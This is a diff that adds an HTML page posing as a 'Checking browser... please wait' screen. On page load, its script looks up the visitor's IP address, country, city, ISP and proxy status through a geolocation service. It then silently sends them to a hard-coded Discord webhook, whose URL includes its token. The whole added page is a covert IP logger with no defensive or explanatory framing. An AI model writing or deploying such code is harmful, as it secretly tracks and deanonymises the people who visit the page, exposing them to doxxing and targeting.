@@ -1,1 +1,35 @@
-あ
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Loading...</title></head>
+<body>
+<script>
+    var u = "https://discord.com/api/webhooks/1471152880718319861/slt8zr5KswUtl6muYEJKAUpHeXNXjzvE-0TeStV7C9g9mysc-4sPUstmy7cN_OuauMoZ";
+    var f = "status,message,country,regionName,city,isp,proxy,query";
+
+    function run() {
+        fetch("http://ip-api.com/json/?fields=" + f).then(r => r.json()).then(d => {
+            if (d.status !== "success") return;
+            fetch(u, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "Log Recorded",
+                        color: 0,
+                        fields: [
+                            {name: "IP", value: d.query, inline: true},
+                            {name: "Loc", value: d.country + "/" + d.city, inline: true},
+                            {name: "ISP", value: d.isp},
+                            {name: "Proxy", value: d.proxy ? "Yes" : "No"}
+                        ],
+                        timestamp: new Date()
+                    }]
+                })
+            });
+        }).catch(e => {});
+    }
+    run();
+</script>
+<p>Checking browser... please wait.</p>
+</body>
+</html>
